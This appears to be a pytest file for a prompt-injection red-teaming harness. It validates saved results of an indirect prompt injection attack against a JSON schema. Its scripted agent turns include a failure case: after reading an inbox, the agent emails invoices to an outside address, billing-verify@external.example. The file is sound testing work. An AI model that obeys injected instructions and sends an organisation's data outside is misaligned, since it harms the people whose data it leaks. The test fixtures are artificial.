"""Saved results against schema/results.v1.json."""

import json
from pathlib import Path

import jsonschema
import pytest

import lure
from lure.attacks import load_attack
from lure.exposure import OrgPolicy
from lure.judge.llm_judge import LLMJudge
from lure.rescore import add_exposure, rescore, save_rescored
from lure.runner import SCHEMA_VERSION, run_attack
from tests.fakes import AdapterError, ScriptedAdapter, call, say

REPO = Path(__file__).resolve().parent.parent
SCHEMA_PATH = REPO / "schema" / f"results.v{SCHEMA_VERSION}.json"
SCHEMA = json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))
VALIDATOR = jsonschema.Draft202012Validator(SCHEMA, format_checker=jsonschema.FormatChecker())
IPI_001 = load_attack(REPO / "attacks" / "indirect_prompt_injection" / "lure-ipi-001.yaml")
POLICY = OrgPolicy(("corp.example",))
SUMMARY = "Acme Supply sent invoice INV-20931 for $4,812.50."
OUTSIDE = call("send_email", "c2", to=["billing-verify@external.example"], subject="Invoices",
               body="Attached.")


def record(*turns, **kwargs):
    result = run_attack(IPI_001, ScriptedAdapter(*turns), **kwargs)
    return json.loads(json.dumps(result.to_dict()))


def errors(data):
    return [e.message for e in VALIDATOR.iter_errors(data)]


def test_schema_is_valid_draft_2020_12():
    jsonschema.Draft202012Validator.check_schema(SCHEMA)
    assert SCHEMA["properties"]["schema_version"]["const"] == SCHEMA_VERSION


def test_record_carries_versions_and_attack_file():
    data = record(call("read_inbox"), say(SUMMARY))
    assert data["schema_version"] == SCHEMA_VERSION
    assert data["lure_version"] == lure.__version__
    assert data["attack"]["file"] == "attacks/indirect_prompt_injection/lure-ipi-001.yaml"


def test_attack_outside_attacks_folder_has_absolute_file(tmp_path):
    src = IPI_001.source
    copy = tmp_path / src.name
    copy.write_text(src.read_text(encoding="utf-8"), encoding="utf-8")
    attack = load_attack(copy, root=REPO)
    assert attack.file == copy.resolve().as_posix()


@pytest.mark.parametrize("turns, kwargs", [
    ((call("read_inbox"), say(SUMMARY)), {}),
    ((call("read_inbox"), OUTSIDE, say("Done.")), {"org_policy": POLICY}),
    ((AdapterError("boom"),), {}),
    ((call("read_inbox"), call("read_inbox", "c2"), say(SUMMARY)), {"max_turns": 1}),
], ids=["pass", "fail-with-exposure", "error", "max-turns"])
def test_new_records_validate(turns, kwargs):
    assert errors(record(*turns, **kwargs)) == []


def test_llm_judged_and_llm_failed_records_validate():
    answer = say(json.dumps({"label": "ignored", "justification": 'Says "Acme Supply".'}))
    judged = record(call("read_inbox"), say(SUMMARY),
                    llm_judge=LLMJudge(ScriptedAdapter(answer)))
    assert judged["judgment"]["llm_judged"] is True
    failed = record(call("read_inbox"), say(SUMMARY),
                    llm_judge=LLMJudge(ScriptedAdapter(AdapterError("down"))))
    assert "error" in failed["judgment"]["llm_judge"]
    assert errors(judged) == [] and errors(failed) == []


def test_rescored_copies_validate(tmp_path):
    data = record(call("read_inbox"), OUTSIDE, say("Done."))
    source = tmp_path / "run.json"
    path = save_rescored(rescore(data, IPI_001, org_policy=POLICY), data, source, tmp_path / "a")
    assert errors(json.loads(path.read_text(encoding="utf-8"))) == []
    assert errors(add_exposure(data, POLICY, source, tmp_path / "b")) == []


def test_lure_1_0_record_validates():
    """Records from 1.0.0 lack the fields added since; they must still validate."""
    data = record(call("read_inbox"), say(SUMMARY))
    for key in ("schema_version", "lure_version", "judge", "usage", "exposure"):
        del data[key]
    for key in ("version", "file"):
        del data["attack"][key]
    del data["judgment"]["task_incomplete"], data["judgment"]["llm_judged"]
    assert errors(data) == []


@pytest.mark.parametrize("change", [
    lambda d: d.update(schema_version=2),
    lambda d: d.update(surprise=True),
    lambda d: d["judgment"].update(verdict="Maybe"),
    lambda d: d["attack"].update(severity="severe"),
    lambda d: d["attack"].update(atlas=["T1566"]),
    lambda d: d.update(started_at="yesterday"),
    lambda d: d["tool_calls"][0].pop("args"),
    lambda d: d.pop("judgment"),
], ids=["schema-version", "unknown-key", "verdict", "severity", "atlas-id", "timestamp",
        "call-args", "no-judgment"])
def test_broken_records_are_rejected(change):
    data = record(call("read_inbox"), say(SUMMARY))
    change(data)
    assert errors(data)
